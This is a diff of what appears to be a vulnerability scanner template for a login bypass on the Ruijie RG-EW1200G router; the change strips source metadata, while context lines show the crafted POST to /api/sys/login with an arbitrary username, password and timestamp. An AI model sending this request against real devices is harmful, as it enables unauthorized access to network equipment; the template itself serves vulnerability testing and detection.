@@ -3,12 +3,8 @@ info:
   name: 锐捷 RG-EW1200G 登录绕过
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/om2maaelxl4hqy3y'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: om2maaelxl4hqy3y
-    fofa: 暂无
 http:
 - raw:
   - 'POST /api/sys/login HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     {"username":"2","password":"dsaff","timestamp":1695813951000}
